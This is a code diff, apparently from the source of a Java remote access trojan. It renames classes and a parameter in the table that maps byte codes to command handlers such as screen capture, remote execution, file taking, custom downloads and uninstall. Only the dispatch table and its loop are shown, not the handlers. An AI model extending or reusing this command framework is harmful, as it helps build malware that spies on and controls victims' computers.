@@ -12,7 +12,7 @@ public abstract class AbstractIncomingPacket {
 	static {
 		packets.clear();
 		packets.put(/* "MSGBOX" */(byte) 10, PacketMSGBOX.class);
-		packets.put(/* "DISCONNECT" */(byte) 11, PacketDISCONNECT.class);
+		packets.put(/* "DISCONNECT" */(byte) 11, Packet11Disconnect.class);
 		packets.put(/* "GETSCREEN" */(byte) 12, PacketGETSCREEN.class);
 		packets.put(/* "GETSCREENONCE" */(byte) 13, PacketGETSCREENONCE.class);
 		packets.put(/* "VISITURL" */(byte) 14, PacketVISITURL.class);
@@ -38,15 +38,15 @@ public abstract class AbstractIncomingPacket {
 		packets.put(/* "CUSTOMDL" */(byte) 34, PacketCUSTOMDL.class);
 		packets.put(/* "SCRIPT" */(byte) 35, PacketSCRIPT.class);
 		packets.put(/* "UNINSTALL" */(byte) 36, PacketUNINSTALL.class);
-		packets.put(/* "RESTARTC" */(byte) 37, PacketRESTARTC.class);
+		packets.put(/* "RESTARTC" */(byte) 37, Packet37RestartJavaProcess.class);
 		packets.put(/* "REXEC" */(byte) 38, PacketREXEC.class);
 		packets.put(/* "VISITURLMUCH" */(byte) 39, PacketVISITURLMUCH.class);
-		packets.put(/* "THUMBNAIL" */(byte) 40, PacketTHUMBNAIL.class);
+		packets.put(/* "THUMBNAIL" */(byte) 40, Packet40Thumbnail.class);
 		packets.put(/* "DIR" */(byte) 41, PacketDIR.class);
 		packets.put(/* "TAKEFILE" */(byte) 42, PacketTAKEFILE.class);
 		packets.put(/* "MKDIR" */(byte) 43, PacketMKDIR.class);
 		packets.put(/* "URLSOUND" */(byte) 44, PacketURLSOUND.class);
-		packets.put(/* "RECONNECT" */(byte) 45, PacketRECONNECT.class);
+		packets.put(/* "RECONNECT" */(byte) 45, Packet45Reconnect.class);
 		packets.put(/* "CMOUSE" */(byte) 46, PacketCMOUSE.class);
 		packets.put(/* "RNTO" */(byte) 47, PacketRNTO.class);
 		packets.put(/* "STARTCHAT" */(byte) 48, PacketSTARTCHAT.class);
@@ -103,16 +103,16 @@ public abstract class AbstractIncomingPacket {
 		packets.put(/* "ENC" */(byte) 99, PacketENC.class);
 	}
 
-	public static final void execute(byte line) {
+	public static final void execute(byte header) {
 		try {
 			for (Plugin p : Plugin.list) {
-				p.methods.get("onpacket").invoke(p.instance, new Object[] { line });
+				p.methods.get("onpacket").invoke(p.instance, new Object[] { header });
 			}
 
 			AbstractIncomingPacket packet = null;
 			Set<Byte> set = packets.keySet();
 			for (byte str : set) {
-				if (str == line) {
+				if (str == header) {
 					packet = packets.get(str).newInstance();
 					break;
 				}
@@ -126,7 +126,7 @@ public abstract class AbstractIncomingPacket {
 				}
 			}
 		} catch (Exception ex) {
-			Exception ex1 = new Exception("Failed to handle packet " + line, ex);
+			Exception ex1 = new Exception("Failed to handle packet " + header, ex);
 			ex1.printStackTrace();
 		}
 	}
